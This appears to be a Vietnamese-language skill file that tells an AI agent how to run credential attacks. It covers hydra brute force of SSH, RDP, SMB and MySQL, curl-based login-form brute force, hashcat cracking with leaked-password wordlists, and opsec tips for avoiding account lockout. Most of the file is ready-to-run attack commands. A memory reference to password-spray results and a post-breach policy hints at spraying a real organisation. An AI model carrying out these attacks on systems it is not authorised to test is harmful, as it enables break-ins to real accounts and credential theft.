---
name: redteam-bruteforce
description: Brute force credential — protocol (SSH/RDP/SMB/FTP/MySQL) + HTTP form + offline hash crack. Dùng khi user nói "bruteforce", "spray", "crack hash", "đánh password", "brute SSH/RDP/login". Phân biệt rõ traffic proxiable (HTTP) vs raw-socket (protocol).
---

# 🔨 RedTeam-Bruteforce — Credential & Hash

## Quan trọng: loại traffic (config 2026-07-11 — tools chạy DIRECT, không proxy)
| Loại | Egress | Lý do |
|---|---|---|
| **HTTP form login** | DIRECT (curl) | có thể route qua SOCKS5h nếu set env/`-x` |
| **SSH/RDP/SMB/FTP/MySQL** (hydra) | DIRECT | raw socket, không qua SOCKS5 |
| **Offline hash** (hashcat) | local | không chạm target |

→ Mặc định DIRECT. Muốn HTTP form qua proxy: `curl -x socks5h://...`. Hydra luôn direct.

## Workflow tự động
```powershell
# 1. HTTP form brute (qua proxy, lab-compliant)
.\workflows\bruteforce.ps1 -Url https://t.com/login `
  -Users users.txt -Pass rockyou.txt `
  -Form 'user=^USER^&pass=^PASS^:F=Invalid credentials' -Method POST

# 2. Protocol brute (hydra, direct)
.\workflows\bruteforce.ps1 -Target 10.0.0.5 -Service ssh `
  -Users users.txt -Pass pass.txt -Threads 8

# 3. Offline hash crack (hashcat docker)
.\workflows\bruteforce.ps1 -HashFile hashes.txt -Mode 1000 -Pass rockyou.txt
```

## Hydra nhanh (protocol)
```
hydra -L users.txt -P pass.txt -t 8 -f -o out.txt <host> <service>
# Services: ssh ftp rdp smb mysql postgresql mssql vnc telnet snmp ...
# -f: dừng khi tìm thấy. -t: threads (giảm nếu target block).
# RDP: hydra -t 1 (RDP hạn chế concurrent). SMB: -m SMB2.
```

## HTTP form brute (curl + proxy) — form spec
`-Form '<body>:F=<fail-marker>'` — body dùng `^USER^`/`^PASS^`, `:F=` là chuỗi báo fail.
- GET form: đổi `-Method GET`, body thành querystring.
- Spray rule (lab discipline): **1 hit/user rồi dừng** (policy strong post-breach, xem memory `vtv-password-spray-results`).
- Rate:加了 random delay, `-k` (self-signed).

## Wordlists
| Mục tiêu | File |
|---|---|
| Password phổ biến | `SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt` |
| rockyou | `SecLists/Passwords/Leaked-Databases/rockyou-75.txt` (hoặc full rockyou nếu có) |
| Username | `SecLists/Usernames/Names/names.txt`, `top-usernames-shortlist.txt` |
| VN context | tự build từ email pattern `firstname.lastname@domain` |

## Hashcat modes (-m)
| Hash | -m | Hash | -m |
|---|---|---|---|
| NTLM | 1000 | MD5 | 0 |
| SHA1 | 100 | SHA256 | 1400 |
| bcrypt | 3200 | JWT (HS256) | 16500 |
| Kerberos 5 (etype23) | 13100 | MSSQL | 1731 |

```
hashcat -m 1000 -a 0 hashes.txt rockyou.txt          # dict
hashcat -m 0 -a 3 hashes.txt '?d?d?d?d?d?d?d'        # mask brute
```

## FP audit / opsec
- Lockout policy: spray 1 pass/round across all users, not all passes on 1 user.
- False "HIT": verify fail-marker đúng (some apps return 200 luôn) → check redirect/cookie/token thay vì body.
- Hydra RDP `-t 1`; SMB thêm `-m SMB2`; luôn có `-f`.
